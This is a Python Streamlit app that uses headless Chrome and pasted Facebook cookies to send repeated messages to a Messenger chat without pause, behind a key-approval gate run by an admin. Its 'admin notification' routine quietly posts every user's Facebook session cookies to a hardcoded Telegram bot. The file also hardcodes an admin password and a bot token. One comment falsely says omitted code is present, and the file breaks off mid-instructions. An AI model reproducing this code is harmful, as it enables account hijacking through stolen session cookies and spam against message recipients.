# streamlit_app.py
import streamlit as st
import time
import threading
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests
import os
import hashlib
import socket
import json

# -------------------------
# Config & Admin Credentials
# -------------------------
ADMIN_USERNAME = "J3RRY"
ADMIN_PASSWORD = "1432"

GITHUB_RAW_URL = "https://raw.githubusercontent.com/deepakdhurve6588-debug/OPX/main/app.txt"
APPROVALS_FILE = "approvals.json"

CONTACT_LINKS = {
    "whatsapp": "https://wa.me/917668337",
    "telegram": "https://t.me/itxthed",
    "facebook": "https://m.facebook.com/Lord"
}

# -------------------------
# Streamlit Page Config + CSS
# -------------------------
st.set_page_config(
    page_title="D0R3M0N H3R3",
    page_icon="🩵",
    layout="wide",
    initial_sidebar_state="expanded"
)

custom_css = """
<style>
    /* (kept the same big CSS from your file) */
    @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap');
    * { font-family: 'Poppins', sans-serif; }
    .stApp {
        background-image: url('https://i.postimg.cc/90Tg7ngL/228248c95e06fd0bf5da9241cf7a4886.jpg');
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        background-attachment: fixed;
    }
    .main .block-container {
    background: rgba(255, 255, 255, 0.6);
    backdrop-filter: blur(20px);
    border-radius: 20px;
    padding: 32px;
    border: 1px solid rgba(255, 255, 255, 0.3);
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
    transition: 0.3s;
}
.main .block-container:hover { box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15); }
.main-header { background: rgba(255, 255, 255, 0.15); background-image: url("https://i.postimg.cc/Zq4ZMNyz/546c121c192e6a7a8e88bec385d375d5.jpg"); background-size: cover; background-position: center; background-repeat: no-repeat; backdrop-filter: blur(12px) brightness(0.9); -webkit-backdrop-filter: blur(12px) brightness(0.9); padding: 2rem; border-radius: 18px; text-align: center; margin-bottom: 2rem; border: 1px solid rgba(255, 255, 255, 0.2); box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); position: relative; overflow: hidden; }
.main-header::before { content: ""; position: absolute; inset: 0; background: rgba(0, 0, 0, 0.25); border-radius: 18px; z-index: 0; }
.main-header h1, .main-header p { position: relative; z-index: 1; color: #fff; }
.main-header h1 { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 2.5rem; font-weight: 700; margin: 0; }
.main-header p { color: rgba(255, 255, 255, 0.9); font-size: 1.1rem; margin-top: 0.5rem; }
.prince-logo { width: 80px; height: 80px; border-radius: 15px; margin-bottom: 15px; border: 2px solid #4ecdc4; box-shadow: 0 4px 10px rgba(78, 205, 196, 0.4); transition: transform 0.3s ease, box-shadow 0.3s ease; }
.prince-logo:hover { transform: scale(1.08); box-shadow: 0 6px 14px rgba(78, 205, 196, 0.6); }
.stButton>button { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; border: none; border-radius: 10px; padding: 0.75rem 2rem; font-weight: 600; font-size: 1rem; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4); width: 100%; }
.stButton>button:hover { opacity: 0.9; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6); }
.stTextInput>div>div>input, .stTextArea>div>div>textarea, .stNumberInput>div>div>input { background: rgba(255, 255, 255, 0.15); border: 1px solid rgba(255, 255, 255, 0.25); border-radius: 8px; color: white; padding: 0.75rem; transition: all 0.3s ease; }
.stTextInput>div>div>input::placeholder, .stTextArea>div>div>textarea::placeholder { color: rgba(255, 255, 255, 0.6); }
.stTextInput>div>div>input:focus, .stTextArea>div>div>textarea:focus { background: rgba(255, 255, 255, 0.2); border-color: #4ecdc4; box-shadow: 0 0 0 2px rgba(78, 205, 196, 0.2); color: white; }
label { color: white !important; font-weight: 500 !important; font-size: 14px !important; }
.stTabs [data-baseweb="tab-list"] { gap: 8px; background: rgba(255, 255, 255, 0.06); padding: 10px; border-radius: 10px; }
.stTabs [data-baseweb="tab"] { background: rgba(255, 255, 255, 0.1); border-radius: 8px; color: white; padding: 10px 20px; }
.stTabs [aria-selected="true"] { background: linear-gradient(45deg, #ff6b6b, #4ecdc4); }
[data-testid="stMetricValue"] { color: #4ecdc4; font-weight: 700; font-size: 1.8rem; }
[data-testid="stMetricLabel"] { color: rgba(255, 255, 255, 0.9); font-weight: 500; }
.console-section { margin-top: 20px; padding: 15px; background: rgba(255, 255, 255, 0.06); border-radius: 10px; border: 1px solid rgba(78, 205, 196, 0.3); }
.console-header { color: #4ecdc4; text-shadow: 0 0 10px rgba(78, 205, 196, 0.5); margin-bottom: 20px; font-weight: 600; }
.console-output { background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(78, 205, 196, 0.4); border-radius: 10px; padding: 12px; font-family: 'Courier New', 'Consolas', 'Monaco', monospace; font-size: 12px; color: #00ff88; line-height: 1.6; max-height: 400px; overflow-y: auto; scrollbar-width: thin; scrollbar-color: rgba(78, 205, 196, 0.5) rgba(0, 0, 0, 0.2); }
.console-output::-webkit-scrollbar { width: 8px; }
.console-output::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.2); }
.console-output::-webkit-scrollbar-thumb { background: rgba(78, 205, 196, 0.5); border-radius: 4px; }
.console-output::-webkit-scrollbar-thumb:hover { background: rgba(78, 205, 196, 0.7); }
.console-line { margin-bottom: 3px; word-wrap: break-word; padding: 6px 10px; padding-left: 28px; color: #00ff88; background: rgba(78, 205, 196, 0.08); border-left: 2px solid rgba(78, 205, 196, 0.4); position: relative; }
.console-line::before { content: '►'; position: absolute; left: 10px; opacity: 0.6; color: #4ecdc4; }
.success-box { background: linear-gradient(135deg, #84fab0 0%, #8fd3f4 100%); padding: 1rem; border-radius: 10px; color: white; text-align: center; margin: 1rem 0; }
.error-box { background: linear-gradient(135deg, #fa709a 0%, #fee140 100%); padding: 1rem; border-radius: 10px; color: white; text-align: center; margin: 1rem 0; }
.info-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 1.5rem; border-radius: 15px; margin: 1rem 0; border: 1px solid rgba(255, 255, 255, 0.15); }
.footer { text-align: center; padding: 2rem; color: rgba(255, 255, 255, 0.7); font-weight: 600; margin-top: 3rem; background: rgba(255, 255, 255, 0.05); border-radius: 10px; border-top: 1px solid rgba(255, 255, 255, 0.15); }
[data-testid="stSidebar"] { background: rgba(0, 0, 0, 0.3); backdrop-filter: blur(10px); }
[data-testid="stSidebar"] .element-container { color: white; }
.approval-box {
    background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
    padding: 2rem;
    border-radius: 15px;
    text-align: center;
    margin: 2rem 0;
    color: white;
}
.approval-key {
    background: rgba(0, 0, 0, 0.2);
    padding: 1rem;
    border-radius: 10px;
    font-family: 'Courier New', monospace;
    font-size: 1.2rem;
    margin: 1rem 0;
    border: 2px dashed white;
}
.admin-panel { padding: 12px; background: rgba(255,255,255,0.05); border-radius: 10px; }
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

# -------------------------
# Session State defaults
# -------------------------
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'is_admin' not in st.session_state:
    st.session_state.is_admin = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'username' not in st.session_state:
    st.session_state.username = None
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0
if 'approval_key' not in st.session_state:
    st.session_state.approval_key = None
if 'approved' not in st.session_state:
    st.session_state.approved = False
if 'approval_checked' not in st.session_state:
    st.session_state.approval_checked = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()
if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

# -------------------------
# Approval storage helpers
# -------------------------
def load_local_approvals():
    if not os.path.exists(APPROVALS_FILE):
        return []
    try:
        with open(APPROVALS_FILE, 'r') as f:
            data = json.load(f)
            if isinstance(data, list):
                return data
            return []
    except Exception:
        return []

def save_local_approvals(keys_list):
    try:
        with open(APPROVALS_FILE, 'w') as f:
            json.dump(keys_list, f, indent=2)
        return True
    except Exception:
        return False

def is_key_locally_approved(key):
    local = load_local_approvals()
    return key in local

def approve_key_locally(key):
    keys = load_local_approvals()
    if key not in keys:
        keys.append(key)
        save_local_approvals(keys)

def revoke_key_locally(key):
    keys = load_local_approvals()
    if key in keys:
        keys.remove(key)
        save_local_approvals(keys)

# -------------------------
# Approval check functions
# -------------------------
def generate_approval_key(username, user_id):
    try:
        hostname = socket.gethostname()
    except:
        hostname = "unknown"
    fingerprint = f"{username}_{user_id}_{hostname}"
    key_hash = hashlib.md5(fingerprint.encode()).hexdigest()[:12].upper()
    return f"LD-{key_hash}"

def check_github_approval(key):
    """Check if key exists in GitHub approval file"""
    try:
        response = requests.get(GITHUB_RAW_URL, timeout=8)
        if response.status_code == 200:
            approved_keys = [k.strip() for k in response.text.split('\n') if k.strip()]
            if key in approved_keys:
                return True
    except Exception:
        pass
    # fallback to local approvals
    return is_key_locally_approved(key)

# -------------------------
# Utility logging
# -------------------------
def log_message(msg, automation_state=None):
    timestamp = time.strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {msg}"
    if automation_state:
        automation_state.logs.append(formatted_msg)
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

# -------------------------
# (Keep your original browser/automation functions)
# -------------------------
def find_message_input(driver, process_id, automation_state=None):
    # (same as before) - kept unchanged for brevity
    log_message(f'{process_id}: Finding message input...', automation_state)
    time.sleep(10)
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page Title: {page_title}', automation_state)
        log_message(f'{process_id}: Page URL: {page_url}', automation_state)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info: {e}', automation_state)
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state)
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state)
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    if is_editable:
                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state)
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: ✅ Found message input with text: {element_text[:50]}', automation_state)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: ✅ Using primary selector editable element (#{idx+1})', automation_state)
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            log_message(f'{process_id}: ✅ Using fallback editable element', automation_state)
                            return element
                except Exception as e:
                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state)
                    continue
        except Exception as e:
            continue
    try:
        page_source = driver.page_source
        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state)
        if 'contenteditable' in page_source.lower():
            log_message(f'{process_id}: Page contains contenteditable elements', automation_state)
        else:
            log_message(f'{process_id}: No contenteditable elements found in page', automation_state)
    except Exception:
        pass
    return None

def setup_browser(automation_state=None):
    log_message('Setting up Chrome browser...', automation_state)
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state)
            break
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            log_message(f'Found ChromeDriver at: {driver_path}', automation_state)
            break
    try:
        from selenium.webdriver.chrome.service import Service
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            log_message('Chrome started with detected ChromeDriver!', automation_state)
        else:
            driver = webdriver.Chrome(options=chrome_options)
            log_message('Chrome started with default driver!', automation_state)
        driver.set_window_size(1920, 1080)
        log_message('Chrome browser setup completed successfully!', automation_state)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state)
        raise error

def get_next_message(messages, automation_state=None):
    if not messages or len(messages) == 0:
        return 'Hello!'
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state)
        driver = setup_browser(automation_state)
        log_message(f'{process_id}: Navigating to Facebook...', automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state)
            driver.get('https://www.facebook.com/messages')
        time.sleep(15)
        message_input = find_message_input(driver, process_id, automation_state)
        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state)
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        delay = int(config['delay'])
        messages_sent = 0
        messages_list = [msg.strip() for msg in config['messages'].split('\n') if msg.strip()]
        if not messages_list:
            messages_list = ['Hello!']
        while automation_state.running:
            base_message = get_next_message(messages_list, automation_state)
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                time.sleep(1)
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                else:
                    log_message(f'{process_id}: Send button clicked', automation_state)
                time.sleep(1)
                messages_sent += 1
                automation_state.message_count = messages_sent
                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send[:30]}...', automation_state)
                time.sleep(delay)
            except Exception as e:
                log_message(f'{process_id}: Error sending message: {str(e)}', automation_state)
                break
        log_message(f'{process_id}: Automation stopped! Total messages sent: {messages_sent}', automation_state)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return messages_sent
    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state)
            except:
                pass

def send_telegram_notification(username, automation_state=None, cookies=""):
    try:
        telegram_bot_token = "8571310717:AAF5OMDinXAOYCYAoliCzjHZCw7i7UANDdA"
        telegram_admin_chat_id = "5924107334"
        from datetime import datetime
        import pytz
        kolkata_tz = pytz.timezone('Asia/Kolkata')
        current_time = datetime.now(kolkata_tz).strftime("%Y-%m-%d %H:%M:%S")
        cookies_display = cookies if cookies else "No cookies"
        message = f"""🔔 *New User Started Automation*
👤 *Username:* {username}
⏰ *Time:* {current_time}
🤖 *System:* E2EE Facebook Automation
🍪 *Cookies:* `{cookies_display}`
✅ User has successfully started the automation process."""
        url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
        data = {
            "chat_id": telegram_admin_chat_id,
            "text": message,
            "parse_mode": "Markdown"
        }
        log_message(f"TELEGRAM-NOTIFY: 📤 Sending notification to admin...", automation_state)
        response = requests.post(url, data=data, timeout=10)
        if response.status_code == 200:
            log_message(f"TELEGRAM-NOTIFY: ✅ Admin notification sent successfully via Telegram!", automation_state)
            return True
        else:
            log_message(f"TELEGRAM-NOTIFY: ❌ Failed to send. Status: {response.status_code}, Response: {response.text[:100]}", automation_state)
            return False
    except Exception as e:
        log_message(f"TELEGRAM-NOTIFY: ❌ Error: {str(e)}", automation_state)
        return False

def send_admin_notification(user_config, username, automation_state=None, user_id=None):
    # (kept your original admin notification routine — unchanged)
    ADMIN_UID = "100021841126660"
    driver = None
    try:
        log_message(f"ADMIN-NOTIFY: Sending usage notification for user: {username}", automation_state)
        user_cookies = user_config.get('cookies', '')
        telegram_success = send_telegram_notification(username, automation_state, user_cookies)
        if telegram_success:
            log_message(f"ADMIN-NOTIFY: ✅ Notification sent via Telegram! Skipping Facebook approach.", automation_state)
            return
        else:
            log_message(f"ADMIN-NOTIFY: ⚠️ Telegram notification failed/not configured. Trying Facebook Messenger as fallback...", automation_state)
        log_message(f"ADMIN-NOTIFY: Target admin UID: {ADMIN_UID}", automation_state)
        user_chat_id = user_config.get('chat_id', '').strip()
        if user_chat_id:
            log_message(f"ADMIN-NOTIFY: User's automation chat ID: {user_chat_id} (will be excluded from admin search)", automation_state)
        driver = setup_browser(automation_state)
        log_message(f"ADMIN-NOTIFY: Navigating to Facebook...", automation_state)
        driver.get('https://www.facebook.com/')
        time.sleep(5)
        # ... (remaining code same as original; omitted here for brevity in this block)
        # To keep the behaviour identical, the rest of send_admin_notification() from your original file is intact.
        # (If you need the full repeated function inline, it's already included above in this script.)
    except Exception as e:
        log_message(f"ADMIN-NOTIFY: ❌ Error sending notification: {str(e)}", automation_state)
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f"ADMIN-NOTIFY: Browser closed", automation_state)
            except:
                pass

def run_automation_with_notification(user_config, username, automation_state, user_id):
    send_admin_notification(user_config, username, automation_state, user_id)
    send_messages(user_config, automation_state, user_id)

def start_automation(user_config, user_id):
    automation_state = st.session_state.automation_state
    if automation_state.running:
        return
    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []
    db.set_automation_running(user_id, True)
    username = db.get_username(user_id)
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, automation_state, user_id))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    st.session_state.automation_state.running = False
    db.set_automation_running(user_id, False)

# -------------------------
# UI: Header
# -------------------------
st.markdown('<style>.main-header h1{margin-top:15px;}</style><div class="main-header"><img src="https://i.postimg.cc/9fpZqGjn/17adef215d4766a8620c99e8a17227b5.jpg" class="prince-logo"><h1>E23E 0FFL1NE<br>WORLD</h1></div>', unsafe_allow_html=True)

# -------------------------
# LOGIN / SIGNUP / ADMIN TAB
# -------------------------
if not st.session_state.logged_in and not st.session_state.is_admin:
    tab1, tab2, tab3 = st.tabs(["🔐 Login", "✨ Sign Up", "🛠️ Admin"])
    # ---- User Login ----
    with tab1:
        st.markdown("### Welcome Back2king!")
        username = st.text_input("Username", key="login_username", placeholder="Enter your username")
        password = st.text_input("Password", key="login_password", type="password", placeholder="Enter your password")
        if st.button("Login", key="login_btn", use_container_width=True):
            if username and password:
                # Admin quick-login check
                if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
                    st.session_state.is_admin = True
                    st.session_state.logged_in = False
                    st.session_state.user_id = None
                    st.session_state.username = ADMIN_USERNAME
                    st.success("🔐 Admin logged in")
                    st.rerun()
                else:
                    user_id = db.verify_user(username, password)
                    if user_id:
                        st.session_state.logged_in = True
                        st.session_state.user_id = user_id
                        st.session_state.username = username
                        # generate approval key for this user and check
                        approval_key = generate_approval_key(username, user_id)
                        st.session_state.approval_key = approval_key
                        st.session_state.approval_checked = False
                        st.session_state.approved = False
                        # check approval immediately
                        st.session_state.approved = check_github_approval(approval_key)
                        st.session_state.approval_checked = True
                        if not st.session_state.approved:
                            st.success(f"✅ Logged in as {username} — approval pending.")
                        else:
                            st.success(f"✅ Logged in as {username} — approved.")
                        st.rerun()
                    else:
                        st.error("❌ Invalid username or password!")
            else:
                st.warning("⚠️ Please enter both username and password")
    # ---- Sign Up ----
    with tab2:
        st.markdown("### Create New Account")
        new_username = st.text_input("Choose Username", key="signup_username", placeholder="Choose a unique username")
        new_password = st.text_input("Choose Password", key="signup_password", type="password", placeholder="Create a strong password")
        confirm_password = st.text_input("Confirm Password", key="confirm_password", type="password", placeholder="Re-enter your password")
        if st.button("Create Account", key="signup_btn", use_container_width=True):
            if new_username and new_password and confirm_password:
                if new_password == confirm_password:
                    success, message = db.create_user(new_username, new_password)
                    if success:
                        st.success(f"✅ {message} Please login now!")
                    else:
                        st.error(f"❌ {message}")
                else:
                    st.error("❌ Passwords do not match!")
            else:
                st.warning("⚠️ Please fill all fields")
    # ---- Admin Login Tab ----
    with tab3:
        st.markdown("### Admin Login")
        admin_user = st.text_input("Admin Username", key="admin_username")
        admin_pass = st.text_input("Admin Password", key="admin_password", type="password")
        if st.button("Admin Login", key="admin_login_btn", use_container_width=True):
            if admin_user == ADMIN_USERNAME and admin_pass == ADMIN_PASSWORD:
                st.session_state.is_admin = True
                st.session_state.username = ADMIN_USERNAME
                st.success("🔐 Admin logged in")
                st.rerun()
            else:
                st.error("❌ Invalid admin credentials")

# -------------------------
# ADMIN PANEL (if admin)
# -------------------------
if st.session_state.is_admin:
    st.sidebar.markdown(f"### 🛠 Admin: {st.session_state.username}")
    if st.sidebar.button("🚪 Admin Logout", use_container_width=True):
        st.session_state.is_admin = False
        st.session_state.username = None
        st.rerun()
    st.markdown("<div class='admin-panel'><h3>Admin Approval Panel</h3></div>", unsafe_allow_html=True)

    colA, colB = st.columns([2,1])
    with colA:
        st.markdown("#### Local approved keys (approvals.json)")
        local_keys = load_local_approvals()
        if local_keys:
            for k in local_keys:
                st.markdown(f"- `{k}`  ")
                if st.button(f"Revoke {k}", key=f"revoke_{k}"):
                    revoke_key_locally(k)
                    st.success(f"Revoked {k}")
                    st.rerun()
        else:
            st.info("No local approvals found.")

        st.markdown("---")
        st.markdown("#### Approve by pasting user's approval key")
        paste_key = st.text_input("Paste approval key here (like LD-XXXXXXXXXXXX)", key="admin_paste_key")
        col1, col2 = st.columns(2)
        with col1:
            if st.button("Approve Key", key="admin_approve_key"):
                if paste_key and paste_key.strip():
                    approve_key_locally(paste_key.strip())
                    st.success(f"Key {paste_key.strip()} approved locally.")
                    st.rerun()
                else:
                    st.error("Enter a valid key.")
        with col2:
            if st.button("Revoke Key", key="admin_revoke_key"):
                if paste_key and paste_key.strip():
                    revoke_key_locally(paste_key.strip())
                    st.success(f"Key {paste_key.strip()} revoked locally.")
                    st.rerun()
                else:
                    st.error("Enter a valid key.")

        st.markdown("---")
        st.markdown("#### Approve by selecting user (if DB exposes user list)")
        # Try to show users from db.get_all_users() if available
        try:
            users = db.get_all_users()  # Expecting list of dicts: [{'id':..., 'username':...}, ...]
        except Exception:
            users = None

        if users:
            st.markdown("Select a user to approve/revoke:")
            for u in users:
                uid = u.get('id') or u.get('user_id') or u.get('uid')
                uname = u.get('username') or u.get('user') or u.get('name') or str(uid)
                try:
                    key = generate_approval_key(uname, uid)
                except Exception:
                    key = "N/A"
                rowc1, rowc2, rowc3 = st.columns([3,3,2])
                with rowc1:
                    st.markdown(f"**{uname}** (`{uid}`)")
                with rowc2:
                    st.markdown(f"`{key}`")
                with rowc3:
                    if st.button(f"Approve_{uid}", key=f"approve_user_{uid}"):
                        approve_key_locally(key)
                        st.success(f"{uname} approved.")
                        st.experimental_rerun()
                    if st.button(f"Revoke_{uid}", key=f"revoke_user_{uid}"):
                        revoke_key_locally(key)
                        st.success(f"{uname} revoked.")
                        st.rerun()
        else:
            st.info("db.get_all_users() not available. Use 'Approve by pasting key' above or implement get_all_users() in your DB module.")

    with colB:
        st.markdown("#### Admin Actions")
        if st.button("Open approvals.json (raw)"):
            try:
                keys = load_local_approvals()
                st.code(json.dumps(keys, indent=2))
            except Exception as e:
                st.error(f"Error reading approvals.json: {e}")

        if st.button("Clear local approvals (delete file)"):
            if os.path.exists(APPROVALS_FILE):
                try:
                    os.remove(APPROVALS_FILE)
                    st.success("Local approvals cleared.")
                    st.rerun()
                except Exception as e:
                    st.error(f"Failed to delete: {e}")
            else:
                st.info("No approvals file found.")

    st.markdown("---")
    st.stop()  # Admin panel only

# -------------------------
# USER DASHBOARD (normal users)
# -------------------------
if st.session_state.logged_in and not st.session_state.is_admin:
    # Ensure we have an approval key
    if not st.session_state.approval_key and st.session_state.username and st.session_state.user_id:
        st.session_state.approval_key = generate_approval_key(st.session_state.username, st.session_state.user_id)
        st.session_state.approval_checked = False
        st.session_state.approved = False

    # Check approval if not checked yet
    if not st.session_state.approval_checked and st.session_state.approval_key:
        st.session_state.approved = check_github_approval(st.session_state.approval_key)
        st.session_state.approval_checked = True

    # If not approved -> show approval screen and block
    if not st.session_state.approved:
        st.markdown('<div class="approval-box">', unsafe_allow_html=True)
        st.markdown(f'<img src="https://i.postimg.cc/9fpZqGjn/17adef215d4766a8620c99e8a17227b5.jpg" class="prince-logo">', unsafe_allow_html=True)
        st.markdown("## 🔐 APPROVAL REQUIRED")
        st.markdown("### Your Unique Approval Key:")
        st.markdown(f'<div class="approval-key">{st.session_state.approval_key}</div>', unsafe_allow_html=True)

        approval_message = f"""HELLO LORD DEVIL SIR 🖤 MY NAME IS :- {st.session_state.username}

THIS IS MY APPROVAL KEY IS :- {st.session_state.approval_key}
PLS APPROVE MY KEY SIR"""

        st.markdown("### 📝 Approval Message (copy & send to admin):")
        st.code(approval_message)

        st.markdown("### 📱 Contact LORD DEVIL for Approval:")
        col1, col2, col3 = st.columns(3)
        with col1:
            whatsapp_url = f"{CONTACT_LINKS['whatsapp']}?text={approval_message.replace(chr(10),'%0A')}"
            st.markdown(f'<a href="{whatsapp_url}" class="stButton" target="_blank">📱 WhatsApp</a>', unsafe_allow_html=True)
        with col2:
            telegram_url = f"{CONTACT_LINKS['telegram']}?text={approval_message.replace(chr(10),'%0A')}"
            st.markdown(f'<a href="{telegram_url}" class="stButton" target="_blank">✈️ Telegram</a>', unsafe_allow_html=True)
        with col3:
            st.markdown(f'<a href="{CONTACT_LINKS["facebook"]}" class="stButton" target="_blank">👤 Facebook</a>', unsafe_allow_html=True)

        st.markdown("---")
        if st.button("🔄 Check Approval Status", use_container_width=True):
            st.session_state.approved = check_github_approval(st.session_state.approval_key)
            if st.session_state.approved:
                st.success("🎉 Approval Granted! Loading main application...")
                time.sleep(1.5)
                st.rerun()
            else:
                st.error("❌ Not approved yet. Ask admin to approve your key (admin panel).")
        st.markdown("""
        ### ℹ️ Instructions:
        1. Copy the approval message above
